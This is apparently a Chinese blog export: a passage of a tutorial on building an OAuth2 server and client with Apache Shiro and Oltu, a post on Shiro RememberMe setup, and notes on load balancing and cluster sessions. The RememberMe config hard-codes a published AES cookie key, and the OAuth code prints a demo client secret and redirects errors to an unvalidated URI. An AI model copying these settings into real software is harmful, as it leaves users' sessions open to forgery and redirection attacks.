//进行OAuth响应构建 OAuthASResponse.OAuthAuthorizationResponseBuilder builder = OAuthASResponse.authorizationResponse(request, HttpServletResponse.SC_FOUND); //设置授权码 builder.setCode(authorizationCode); //得到到客户端重定向地址 String redirectURI = oauthRequest.getParam(OAuth.OAUTH_REDIRECT_URI); //构建响应 final OAuthResponse response = builder.location(redirectURI).buildQueryMessage(); //根据OAuthResponse返回ResponseEntity响应 HttpHeaders headers = new HttpHeaders(); headers.setLocation(new URI(response.getLocationUri())); return new ResponseEntity(headers, HttpStatus.valueOf(response.getResponseStatus())); &#125; catch (OAuthProblemException e) &#123; //出错处理 String redirectUri = e.getRedirectUri(); if (OAuthUtils.isEmpty(redirectUri)) &#123; //告诉客户端没有传入redirectUri直接报错 return new ResponseEntity( &quot;OAuth callback url needs to be provided by client!!!&quot;, HttpStatus.NOT_FOUND); &#125; //返回错误消息（如?error=） final OAuthResponse response = OAuthASResponse.errorResponse(HttpServletResponse.SC_FOUND) .error(e).location(redirectUri).buildQueryMessage(); HttpHeaders headers = new HttpHeaders(); headers.setLocation(new URI(response.getLocationUri())); return new ResponseEntity(headers, HttpStatus.valueOf(response.getResponseStatus())); &#125; &#125; private boolean login(Subject subject, HttpServletRequest request) &#123; if(&quot;get&quot;.equalsIgnoreCase(request.getMethod())) &#123; return false; &#125; String username = request.getParameter(&quot;username&quot;); String password = request.getParameter(&quot;password&quot;); if(StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) &#123; return false; &#125; UsernamePasswordToken token = new UsernamePasswordToken(username, password); try &#123; subject.login(token); return true; &#125; catch (Exception e) &#123; request.setAttribute(&quot;error&quot;, &quot;登录失败:&quot; + e.getClass().getName()); return false; &#125; &#125;&#125;&amp;nbsp; 如上代码的作用： 首先通过如 http://localhost:8080/chapter17-server/authorize?client_id=c1ebe466-1cdc-4bd3-ab69-77c3561b9dee&amp;response_type=code&amp;redirect_uri=http://localhost:9080/chapter17-client/oauth2-login 访问授权页面； 该控制器首先检查 clientId 是否正确；如果错误将返回相应的错误信息； 然后判断用户是否登录了，如果没有登录首先到登录页面登录； 登录成功后生成相应的 auth code 即授权码，然后重定向到客户端地址，如 http://localhost:9080/chapter17-client/oauth2-login?code=52b1832f5dff68122f4f00ae995da0ed；在重定向到的地址中会带上 code 参数（授权码），接着客户端可以根据授权码去换取 access token。 访问令牌控制器 AccessTokenController123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869@RestControllerpublic class AccessTokenController &#123; @Autowired private OAuthService oAuthService; @Autowired private UserService userService; @RequestMapping(&quot;/accessToken&quot;) public HttpEntity token(HttpServletRequest request) throws URISyntaxException, OAuthSystemException &#123; try &#123; //构建OAuth请求 OAuthTokenRequest oauthRequest = new OAuthTokenRequest(request); //检查提交的客户端id是否正确 if (!oAuthService.checkClientId(oauthRequest.getClientId())) &#123; OAuthResponse response = OAuthASResponse .errorResponse(HttpServletResponse.SC_BAD_REQUEST) .setError(OAuthError.TokenResponse.INVALID_CLIENT) .setErrorDescription(Constants.INVALID_CLIENT_DESCRIPTION) .buildJSONMessage(); return new ResponseEntity( response.getBody(), HttpStatus.valueOf(response.getResponseStatus())); &#125; // 检查客户端安全KEY是否正确 if (!oAuthService.checkClientSecret(oauthRequest.getClientSecret())) &#123; OAuthResponse response = OAuthASResponse .errorResponse(HttpServletResponse.SC_UNAUTHORIZED) .setError(OAuthError.TokenResponse.UNAUTHORIZED_CLIENT) .setErrorDescription(Constants.INVALID_CLIENT_DESCRIPTION) .buildJSONMessage(); return new ResponseEntity( response.getBody(), HttpStatus.valueOf(response.getResponseStatus())); &#125; String authCode = oauthRequest.getParam(OAuth.OAUTH_CODE); // 检查验证类型，此处只检查AUTHORIZATION_CODE类型，其他的还有PASSWORD或REFRESH_TOKEN if (oauthRequest.getParam(OAuth.OAUTH_GRANT_TYPE).equals( GrantType.AUTHORIZATION_CODE.toString())) &#123; if (!oAuthService.checkAuthCode(authCode)) &#123; OAuthResponse response = OAuthASResponse .errorResponse(HttpServletResponse.SC_BAD_REQUEST) .setError(OAuthError.TokenResponse.INVALID_GRANT) .setErrorDescription(&quot;错误的授权码&quot;) .buildJSONMessage(); return new ResponseEntity( response.getBody(), HttpStatus.valueOf(response.getResponseStatus())); &#125; &#125; //生成Access Token OAuthIssuer oauthIssuerImpl = new OAuthIssuerImpl(new MD5Generator()); final String accessToken = oauthIssuerImpl.accessToken(); oAuthService.addAccessToken(accessToken, oAuthService.getUsernameByAuthCode(authCode)); //生成OAuth响应 OAuthResponse response = OAuthASResponse .tokenResponse(HttpServletResponse.SC_OK) .setAccessToken(accessToken) .setExpiresIn(String.valueOf(oAuthService.getExpireIn())) .buildJSONMessage(); //根据OAuthResponse生成ResponseEntity return new ResponseEntity( response.getBody(), HttpStatus.valueOf(response.getResponseStatus())); &#125; catch (OAuthProblemException e) &#123; //构建错误响应 OAuthResponse res = OAuthASResponse .errorResponse(HttpServletResponse.SC_BAD_REQUEST).error(e) .buildJSONMessage(); return new ResponseEntity(res.getBody(), HttpStatus.valueOf(res.getResponseStatus())); &#125; &#125;&#125;&amp;nbsp; 如上代码的作用： 首先通过如 http://localhost:8080/chapter17-server/accessToken，POST 提交如下数据：client_id= c1ebe466-1cdc-4bd3-ab69-77c3561b9dee&amp; client_secret= d8346ea2-6017-43ed-ad68-19c0f971738b&amp;grant_type=authorization_code&amp;code=828beda907066d058584f37bcfd597b6&amp;redirect_uri=http://localhost:9080/chapter17-client/oauth2-login 访问； 该控制器会验证 client_id、client_secret、auth code 的正确性，如果错误会返回相应的错误； 如果验证通过会生成并返回相应的访问令牌 access token。 资源控制器 UserInfoController12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455@RestControllerpublic class UserInfoController &#123; @Autowired private OAuthService oAuthService; @RequestMapping(&quot;/userInfo&quot;) public HttpEntity userInfo(HttpServletRequest request) throws OAuthSystemException &#123; try &#123; //构建OAuth资源请求 OAuthAccessResourceRequest oauthRequest = new OAuthAccessResourceRequest(request, ParameterStyle.QUERY); //获取Access Token String accessToken = oauthRequest.getAccessToken(); //验证Access Token if (!oAuthService.checkAccessToken(accessToken)) &#123; // 如果不存在/过期了，返回未验证错误，需重新验证 OAuthResponse oauthResponse = OAuthRSResponse .errorResponse(HttpServletResponse.SC_UNAUTHORIZED) .setRealm(Constants.RESOURCE_SERVER_NAME) .setError(OAuthError.ResourceResponse.INVALID_TOKEN) .buildHeaderMessage(); HttpHeaders headers = new HttpHeaders(); headers.add(OAuth.HeaderType.WWW_AUTHENTICATE, oauthResponse.getHeader(OAuth.HeaderType.WWW_AUTHENTICATE)); return new ResponseEntity(headers, HttpStatus.UNAUTHORIZED); &#125; //返回用户名 String username = oAuthService.getUsernameByAccessToken(accessToken); return new ResponseEntity(username, HttpStatus.OK); &#125; catch (OAuthProblemException e) &#123; //检查是否设置了错误码 String errorCode = e.getError(); if (OAuthUtils.isEmpty(errorCode)) &#123; OAuthResponse oauthResponse = OAuthRSResponse .errorResponse(HttpServletResponse.SC_UNAUTHORIZED) .setRealm(Constants.RESOURCE_SERVER_NAME) .buildHeaderMessage(); HttpHeaders headers = new HttpHeaders(); headers.add(OAuth.HeaderType.WWW_AUTHENTICATE, oauthResponse.getHeader(OAuth.HeaderType.WWW_AUTHENTICATE)); return new ResponseEntity(headers, HttpStatus.UNAUTHORIZED); &#125; OAuthResponse oauthResponse = OAuthRSResponse .errorResponse(HttpServletResponse.SC_UNAUTHORIZED) .setRealm(Constants.RESOURCE_SERVER_NAME) .setError(e.getError()) .setErrorDescription(e.getDescription()) .setErrorUri(e.getUri()) .buildHeaderMessage(); HttpHeaders headers = new HttpHeaders(); headers.add(OAuth.HeaderType.WWW_AUTHENTICATE, 、 oauthResponse.getHeader(OAuth.HeaderType.WWW_AUTHENTICATE)); return new ResponseEntity(HttpStatus.BAD_REQUEST); &#125; &#125;&#125;&amp;nbsp; 如上代码的作用： 首先通过如 http://localhost:8080/chapter17-server/userInfo? access_token=828beda907066d058584f37bcfd597b6 进行访问； 该控制器会验证 access token 的有效性；如果无效了将返回相应的错误，客户端再重新进行授权； 如果有效，则返回当前登录用户的用户名。 Spring 配置文件具体请参考 resources/spring*.xml，此处只列举 spring-config-shiro.xml 中的 shiroFilter 的 filterChainDefinitions 属性： 1234567891011&lt;property name=&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; / = anon /login = authc /logout = logout /authorize=anon /accessToken=anon /userInfo=anon /** = user &lt;/value&gt;&lt;/property&gt;&amp;nbsp; 对于 oauth2 的几个地址 /authorize、/accessToken、/userInfo 都是匿名可访问的。 其他源码请直接下载文档查看。 服务器维护访问 localhost:8080/chapter17-server/，登录后进行客户端管理和用户管理。客户端管理就是进行客户端的注册，如新浪微博的第三方应用就需要到新浪微博开发平台进行注册；用户管理就是进行如新浪微博用户的管理。 对于授权服务和资源服务的实现可以参考新浪微博开发平台的实现： http://open.weibo.com/wiki / 授权机制说明 http://open.weibo.com/wiki/ 微博 API 客户端客户端流程：如果需要登录首先跳到 oauth2 服务端进行登录授权，成功后服务端返回 auth code，然后客户端使用 auth code 去服务器端换取 access token，最好根据 access token 获取用户信息进行客户端的登录绑定。这个可以参照如很多网站的新浪微博登录功能，或其他的第三方帐号登录功能。 POM 依赖此处我们使用 apache oltu oauth2 客户端实现。 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.oltu.oauth2&lt;/groupId&gt; &lt;artifactId&gt;org.apache.oltu.oauth2.client&lt;/artifactId&gt; &lt;version&gt;0.31&lt;/version&gt;&lt;/dependency&gt;&amp;nbsp; 其他的请参考 pom.xml。 OAuth2Token类似于 UsernamePasswordToken 和 CasToken；用于存储 oauth2 服务端返回的 auth code。 12345678public class OAuth2Token implements AuthenticationToken &#123; private String authCode; private String principal; public OAuth2Token(String authCode) &#123; this.authCode = authCode; &#125; //省略getter/setter&#125;&amp;nbsp; OAuth2AuthenticationFilter该 filter 的作用类似于 FormAuthenticationFilter 用于 oauth2 客户端的身份验证控制；如果当前用户还没有身份验证，首先会判断 url 中是否有 code（服务端返回的 auth code），如果没有则重定向到服务端进行登录并授权，然后返回 auth code；接着 OAuth2AuthenticationFilter 会用 auth code 创建 OAuth2Token，然后提交给 Subject.login 进行登录；接着 OAuth2Realm 会根据 OAuth2Token 进行相应的登录逻辑。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162public class OAuth2AuthenticationFilter extends AuthenticatingFilter &#123; //oauth2 authc code参数名 private String authcCodeParam = &quot;code&quot;; //客户端id private String clientId; //服务器端登录成功/失败后重定向到的客户端地址 private String redirectUrl; //oauth2服务器响应类型 private String responseType = &quot;code&quot;; private String failureUrl; //省略setter protected AuthenticationToken createToken(ServletRequest request, ServletResponse response) throws Exception &#123; HttpServletRequest httpRequest = (HttpServletRequest) request; String code = httpRequest.getParameter(authcCodeParam); return new OAuth2Token(code); &#125; protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) &#123; return false; &#125; protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception &#123; String error = request.getParameter(&quot;error&quot;); String errorDescription = request.getParameter(&quot;error_description&quot;); if(!StringUtils.isEmpty(error)) &#123;//如果服务端返回了错误 WebUtils.issueRedirect(request, response, failureUrl + &quot;?error=&quot; + error + &quot;error_description=&quot; + errorDescription); return false; &#125; Subject subject = getSubject(request, response); if(!subject.isAuthenticated()) &#123; if(StringUtils.isEmpty(request.getParameter(authcCodeParam))) &#123; //如果用户没有身份验证，且没有auth code，则重定向到服务端授权 saveRequestAndRedirectToLogin(request, response); return false; &#125; &#125; //执行父类里的登录逻辑，调用Subject.login登录 return executeLogin(request, response); &#125; //登录成功后的回调方法 重定向到成功页面 protected boolean onLoginSuccess(AuthenticationToken token, Subject subject, ServletRequest request, ServletResponse response) throws Exception &#123; issueSuccessRedirect(request, response); return false; &#125; //登录失败后的回调 protected boolean onLoginFailure(AuthenticationToken token, AuthenticationException ae, ServletRequest request, ServletResponse response) &#123; Subject subject = getSubject(request, response); if (subject.isAuthenticated() || subject.isRemembered()) &#123; try &#123; //如果身份验证成功了 则也重定向到成功页面 issueSuccessRedirect(request, response); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; else &#123; try &#123; //登录失败时重定向到失败页面 WebUtils.issueRedirect(request, response, failureUrl); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; return false; &#125;&#125;&amp;nbsp; 该拦截器的作用： 首先判断有没有服务端返回的 error 参数，如果有则直接重定向到失败页面； 接着如果用户还没有身份验证，判断是否有 auth code 参数（即是不是服务端授权之后返回的），如果没有则重定向到服务端进行授权； 否则调用 executeLogin 进行登录，通过 auth code 创建 OAuth2Token 提交给 Subject 进行登录； 登录成功将回调 onLoginSuccess 方法重定向到成功页面； 登录失败则回调 onLoginFailure 重定向到失败页面。 OAuth2Realm12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class OAuth2Realm extends AuthorizingRealm &#123; private String clientId; private String clientSecret; private String accessTokenUrl; private String userInfoUrl; private String redirectUrl; //省略setter public boolean supports(AuthenticationToken token) &#123; return token instanceof OAuth2Token; //表示此Realm只支持OAuth2Token类型 &#125; protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) &#123; SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo(); return authorizationInfo; &#125; protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123; OAuth2Token oAuth2Token = (OAuth2Token) token; String code = oAuth2Token.getAuthCode(); //获取 auth code String username = extractUsername(code); // 提取用户名 SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(username, code, getName()); return authenticationInfo; &#125; private String extractUsername(String code) &#123; try &#123; OAuthClient oAuthClient = new OAuthClient(new URLConnectionClient()); OAuthClientRequest accessTokenRequest = OAuthClientRequest .tokenLocation(accessTokenUrl) .setGrantType(GrantType.AUTHORIZATION_CODE) .setClientId(clientId).setClientSecret(clientSecret) .setCode(code).setRedirectURI(redirectUrl) .buildQueryMessage(); //获取access token OAuthAccessTokenResponse oAuthResponse = oAuthClient.accessToken(accessTokenRequest, OAuth.HttpMethod.POST); String accessToken = oAuthResponse.getAccessToken(); Long expiresIn = oAuthResponse.getExpiresIn(); //获取user info OAuthClientRequest userInfoRequest = new OAuthBearerClientRequest(userInfoUrl) .setAccessToken(accessToken).buildQueryMessage(); OAuthResourceResponse resourceResponse = oAuthClient.resource( userInfoRequest, OAuth.HttpMethod.GET, OAuthResourceResponse.class); String username = resourceResponse.getBody(); return username; &#125; catch (Exception e) &#123; throw new OAuth2AuthenticationException(e); &#125; &#125;&#125; 此 Realm 首先只支持 OAuth2Token 类型的 Token；然后通过传入的 auth code 去换取 access token；再根据 access token 去获取用户信息（用户名），然后根据此信息创建 AuthenticationInfo；如果需要 AuthorizationInfo 信息，可以根据此处获取的用户名再根据自己的业务规则去获取。 Spring shiro 配置（spring-config-shiro.xml）12345678910111213&lt;bean id=&quot;oAuth2Realm&quot; class=&quot;com.github.zhangkaitao.shiro.chapter18.oauth2.OAuth2Realm&quot;&gt; &lt;property name=&quot;cachingEnabled&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;authenticationCachingEnabled&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;authenticationCacheName&quot; value=&quot;authenticationCache&quot;/&gt; &lt;property name=&quot;authorizationCachingEnabled&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;authorizationCacheName&quot; value=&quot;authorizationCache&quot;/&gt; &lt;property name=&quot;clientId&quot; value=&quot;c1ebe466-1cdc-4bd3-ab69-77c3561b9dee&quot;/&gt; &lt;property name=&quot;clientSecret&quot; value=&quot;d8346ea2-6017-43ed-ad68-19c0f971738b&quot;/&gt; &lt;property name=&quot;accessTokenUrl&quot; value=&quot;http://localhost:8080/chapter17-server/accessToken&quot;/&gt; &lt;property name=&quot;userInfoUrl&quot; value=&quot;http://localhost:8080/chapter17-server/userInfo&quot;/&gt; &lt;property name=&quot;redirectUrl&quot; value=&quot;http://localhost:9080/chapter17-client/oauth2-login&quot;/&gt;&lt;/bean&gt;&amp;nbsp; 此 OAuth2Realm 需要配置在服务端申请的 clientId 和 clientSecret；及用于根据 auth code 换取 access token 的 accessTokenUrl 地址；及用于根据 access token 换取用户信息（受保护资源）的 userInfoUrl 地址。 1234&lt;bean id=&quot;oAuth2AuthenticationFilter&quot; class=&quot;com.github.zhangkaitao.shiro.chapter18.oauth2.OAuth2AuthenticationFilter&quot;&gt; &lt;property name=&quot;authcCodeParam&quot; value=&quot;code&quot;/&gt; &lt;property name=&quot;failureUrl&quot; value=&quot;/oauth2Failure.jsp&quot;/&gt;&lt;/bean&gt;&amp;nbsp; 此 OAuth2AuthenticationFilter 用于拦截服务端重定向回来的 auth code。 12345678910111213141516171819&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt; &lt;property name=&quot;loginUrl&quot; value=&quot;http://localhost:8080/chapter17-server/authorize?client_id=c1ebe466-1cdc-4bd3-ab69-77c3561b9dee&amp;amp;response_type=code&amp;amp;redirect_uri=http://localhost:9080/chapter17-client/oauth2-login&quot;/&gt; &lt;property name=&quot;successUrl&quot; value=&quot;/&quot;/&gt; &lt;property name=&quot;filters&quot;&gt; &lt;util:map&gt; &lt;entry key=&quot;oauth2Authc&quot; value-ref=&quot;oAuth2AuthenticationFilter&quot;/&gt; &lt;/util:map&gt; &lt;/property&gt; &lt;property name=&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; / = anon /oauth2Failure.jsp = anon /oauth2-login = oauth2Authc /logout = logout /** = user &lt;/value&gt; &lt;/property&gt;&lt;/bean&gt; 此处设置 loginUrl 为 http://localhost:8080/chapter17-server/authorize?client_id=c1ebe466-1cdc-4bd3-ab69-77c3561b9dee&amp;amp;response_type=code&amp;amp;redirect_uri=http://localhost:9080/chapter17-client/oauth2-login&quot;；其会自动设置到所有的 AccessControlFilter，如 oAuth2AuthenticationFilter；另外 /oauth2-login = oauth2Authc 表示 /oauth2-login 地址使用 oauth2Authc 拦截器拦截并进行 oauth2 客户端授权。 测试1、首先访问 http://localhost:9080/chapter17-client/，然后点击登录按钮进行登录，会跳到如下页面： 2、输入用户名进行登录并授权； 3、如果登录成功，服务端会重定向到客户端，即之前客户端提供的地址 http://localhost:9080/chapter17-client/oauth2-login?code=473d56015bcf576f2ca03eac1a5bcc11，并带着 auth code 过去； 4、客户端的 OAuth2AuthenticationFilter 会收集此 auth code，并创建 OAuth2Token 提交给 Subject 进行客户端登录； 5、客户端的 Subject 会委托给 OAuth2Realm 进行身份验证；此时 OAuth2Realm 会根据 auth code 换取 access token，再根据 access token 获取受保护的用户信息；然后进行客户端登录。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
        <tag>OAuth</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rememberMe]]></title>
    <url>%2F2018%2F11%2F03%2FrememberMe%2F</url>
    <content type="text"><![CDATA[RememberMeShiro 提供了记住我（RememberMe）的功能，比如访问如淘宝等一些网站时，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问，基本流程如下： 首先在登录页面选中 RememberMe 然后登录成功；如果是浏览器登录，一般会把 RememberMe 的 Cookie 写到客户端并保存下来； 关闭浏览器再重新打开；会发现浏览器还是记住你的； 访问一般的网页服务器端还是知道你是谁，且能正常访问； 但是比如我们访问淘宝时，如果要查看我的订单或进行支付时，此时还是需要再进行身份认证的，以确保当前用户还是你。 RememberMe 配置spring-shiro-web.xml 配置： 12345678910&lt;bean id=&quot;sessionIdCookie&quot; class=&quot;org.apache.shiro.web.servlet.SimpleCookie&quot;&gt; &lt;constructor-arg value=&quot;sid&quot;/&gt; &lt;property name=&quot;httpOnly&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;maxAge&quot; value=&quot;-1&quot;/&gt;&lt;/bean&gt;&lt;bean id=&quot;rememberMeCookie&quot; class=&quot;org.apache.shiro.web.servlet.SimpleCookie&quot;&gt; &lt;constructor-arg value=&quot;rememberMe&quot;/&gt; &lt;property name=&quot;httpOnly&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;maxAge&quot; value=&quot;2592000&quot;/&gt;&lt;!-- 30天 --&gt;&lt;/bean&gt;&amp;nbsp; sessionIdCookie：maxAge=-1 表示浏览器关闭时失效此 Cookie； rememberMeCookie：即记住我的 Cookie，保存时长 30 天； 1234567`&lt;!-- rememberMe管理器 --&gt;`&lt;bean id=&quot;rememberMeManager&quot; class=&quot;org.apache.shiro.web.mgt.CookieRememberMeManager&quot;&gt; &lt;property name=&quot;cipherKey&quot; value=&quot;\#&#123;T(org.apache.shiro.codec.Base64).decode(&apos;4AvVhmFLUs0KTA3Kprsdag==&apos;)&#125;&quot;/&gt; &lt;property name=&quot;cookie&quot; ref=&quot;rememberMeCookie&quot;/&gt;&lt;/bean&gt;&amp;nbsp; rememberMe 管理器，cipherKey 是加密 rememberMe Cookie 的密钥；默认 AES 算法； 12345`&lt;!-- 安全管理器 --&gt;`&lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt; …… &lt;property name=&quot;rememberMeManager&quot; ref=&quot;rememberMeManager&quot;/&gt;&lt;/bean&gt;&amp;nbsp; 设置 securityManager 安全管理器的 rememberMeManager； 12345&lt;bean id=&quot;formAuthenticationFilter&quot; class=&quot;org.apache.shiro.web.filter.authc.FormAuthenticationFilter&quot;&gt; …… &lt;property name=&quot;rememberMeParam&quot; value=&quot;rememberMe&quot;/&gt;&lt;/bean&gt;&amp;nbsp; rememberMeParam，即 rememberMe 请求参数名，请求参数是 boolean 类型，true 表示 rememberMe。 1234567891011&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; …… &lt;property name=&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; /login.jsp = authc /logout = logout /authenticated.jsp = authc /** = user &lt;/value&gt; &lt;/property&gt;&lt;/bean&gt;&amp;nbsp; “/authenticated.jsp = authc” 表示访问该地址用户必须身份验证通过（Subject. isAuthenticated()==true）；而 “/** = user” 表示访问该地址的用户是身份验证通过或 RememberMe 登录的都可以。 测试： 访问 http://localhost:8080/chapter13/，会跳转到登录页面，登录成功后会设置会话及 rememberMe Cookie； 关闭浏览器，此时会话 cookie 将失效； 然后重新打开浏览器访问 http://localhost:8080/chapter13/，还是可以访问的； 如果此时访问 http://localhost:8080/chapter13/authenticated.jsp，会跳转到登录页面重新进行身份验证。 如果要自己做 RememeberMe，需要在登录之前这样创建 Token：UsernamePasswordToken(用户名，密码，是否记住我)，如： 1234Subject subject = SecurityUtils.getSubject();UsernamePasswordToken token = new UsernamePasswordToken(username, password);token.setRememberMe(true);subject.login(token);&amp;nbsp; subject.isAuthenticated() 表示用户进行了身份验证登录的，即使有 Subject.login 进行了登录； subject.isRemembered()：表示用户是通过记住我登录的，此时可能并不是真正的你（如你的朋友使用你的电脑，或者你的 cookie 被窃取）在访问的；且两者二选一，即 subject.isAuthenticated()==true，则 subject.isRemembered()==false；反之一样。 另外对于过滤器，一般这样使用：访问一般网页，如个人在主页之类的，我们使用 user 拦截器即可，user 拦截器只要用户登录 (isRemembered()==true or isAuthenticated()==true) 过即可访问成功；访问特殊网页，如我的订单，提交订单页面，我们使用 authc 拦截器即可，authc 拦截器会判断用户是否是通过 Subject.login（isAuthenticated()==true）登录的，如果是才放行，否则会跳转到登录页面叫你重新登录。 因此 RememberMe 使用过程中，需要配合相应的拦截器来实现相应的功能，用错了拦截器可能就不能满足你的需求了。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[集群]]></title>
    <url>%2F2018%2F11%2F03%2F%E9%9B%86%E7%BE%A4%2F</url>
    <content type="text"><![CDATA[一、负载均衡集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。 负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。 负载均衡器可以用来实现高可用以及伸缩性： 高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用； 伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。 负载均衡器运行过程包含两个部分： 根据负载均衡算法得到转发的节点； 进行转发。 负载均衡算法1. 轮询（Round Robin）轮询算法把每个请求轮流发送到每个服务器上。 下图中，一共有 6 个客户端产生了 6 个请求，这 6 个请求按 (1, 2, 3, 4, 5, 6) 的顺序发送。(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。 该算法比较适合每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那么性能较差的服务器可能无法承担过大的负载（下图的 Server 2）。 2. 加权轮询（Weighted Round Robbin）加权轮询是在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值。 例如下图中，服务器 1 被赋予的权值为 5，服务器 2 被赋予的权值为 1，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 1，(6) 请求会被发送到服务器 2。 3. 最少连接（least Connections）由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。 例如下图中，(1, 3, 5) 请求会被发送到服务器 1，但是 (1, 3) 很快就断开连接，此时只有 (5) 请求连接服务器 1；(2, 4, 6) 请求被发送到服务器 2，只有 (2) 的连接断开，此时 (6, 4) 请求连接服务器 2。该系统继续运行时，服务器 2 会承担过大的负载。 最少连接算法就是将请求发送给当前最少连接数的服务器上。 例如下图中，服务器 1 当前连接数最小，那么新到来的请求 6 就会被发送到服务器 1 上。 4. 加权最少连接（Weighted Least Connection）在最少连接的基础上，根据服务器的性能为每台服务器分配权重，再根据权重计算出每台服务器能处理的连接数。 5. 随机算法（Random）把请求随机发送到服务器上。 和轮询算法类似，该算法比较适合服务器性能差不多的场景。 6. 源地址哈希法 (IP Hash)源地址哈希通过对客户端 IP 计算哈希值之后，再对服务器数量取模得到目标服务器的序号。 可以保证同一 IP 的客户端的请求会转发到同一台服务器上，用来实现会话粘滞（Sticky Session） 转发实现1. HTTP 重定向HTTP 重定向负载均衡服务器使用某种负载均衡算法计算得到服务器的 IP 地址之后，将该地址写入 HTTP 重定向报文中，状态码为 302。客户端收到重定向报文之后，需要重新向服务器发起请求。 缺点： 需要两次请求，因此访问延迟比较高； HTTP 负载均衡器处理能力有限，会限制集群的规模。 该负载均衡转发的缺点比较明显，实际场景中很少使用它。 2. DNS 域名解析在 DNS 解析域名的同时使用负载均衡算法计算服务器 IP 地址。 优点： DNS 能够根据地理位置进行域名解析，返回离用户最近的服务器 IP 地址。 缺点： 由于 DNS 具有多级结构，每一级的域名记录都可能被缓存，当下线一台服务器需要修改 DNS 记录时，需要过很长一段时间才能生效。 大型网站基本使用了 DNS 做为第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。也就是说，域名解析的结果为内部的负载均衡服务器 IP 地址。 3. 反向代理服务器反向代理服务器位于源服务器前面，用户的请求需要先经过反向代理服务器才能到达源服务器。反向代理可以用来进行缓存、日志记录等，同时也可以用来做为负载均衡服务器。 在这种负载均衡转发方式下，客户端不直接请求源服务器，因此源服务器不需要外部 IP 地址，而反向代理需要配置内部和外部两套 IP 地址。 优点： 与其它功能集成在一起，部署简单。 缺点： 所有请求和响应都需要经过反向代理服务器，它可能会成为性能瓶颈。 4. 网络层在操作系统内核进程获取网络数据包，根据负载均衡算法计算源服务器的 IP 地址，并修改请求数据包的目的 IP 地址，最后进行转发。 源服务器返回的响应也需要经过负载均衡服务器，通常是让负载均衡服务器同时作为集群的网关服务器来实现。 优点： 在内核进程中进行处理，性能比较高。 缺点： 和反向代理一样，所有的请求和响应都经过负载均衡服务器，会成为性能瓶颈。 5. 链路层在链路层根据负载均衡算法计算源服务器的 MAC 地址，并修改请求数据包的目的 MAC 地址，并进行转发。 通过配置源服务器的虚拟 IP 地址和负载均衡服务器的 IP 地址一致，从而不需要修改 IP 地址就可以进行转发。也正因为 IP 地址一样，所以源服务器的响应不需要转发回负载均衡服务器，可以直接转发给客户端，避免了负载均衡服务器的成为瓶颈。 这是一种三角传输模式，被称为直接路由。对于提供下载和视频服务的网站来说，直接路由避免了大量的网络传输数据经过负载均衡服务器。 这是目前大型网站使用最广负载均衡转发方式，在 Linux 平台可以使用的负载均衡服务器为 LVS（Linux Virtual Server）。 参考： Comparing Load Balancing Algorithms Redirection and Load Balancing 二、集群下的 Session 管理一个用户的 Session 信息如果存储在一个服务器上，那么当负载均衡器把用户的下一个请求转发到另一个服务器，由于服务器没有用户的 Session 信息，那么该用户就需要重新进行登录等操作。 Sticky Session需要配置负载均衡器，使得一个用户的所有请求都路由到同一个服务器，这样就可以把用户的 Session 存放在该服务器中。 缺点： 当服务器宕机时，将丢失该服务器上的所有 Session。 Session Replication在服务器之间进行 Session 同步操作，每个服务器都有所有用户的 Session 信息，因此用户可以向任何一个服务器进行请求。 缺点： 占用过多内存； 同步过程占用网络带宽以及服务器处理器时间。 Session Server使用一个单独的服务器存储 Session 数据，可以使用传统的 MySQL，也使用 Redis 或者 Memcached 这种内存型数据库。 优点： 为了使得大型网站具有伸缩性，集群中的应用服务器通常需要保持无状态，那么应用服务器不能存储用户的会话信息。Session Server 将用户的会话信息单独进行存储，从而保证了应用服务器的无状态。 缺点： 需要去实现存取 Session 的代码。]]></content>
      <categories>
        <category>系统设计</category>
      </categories>
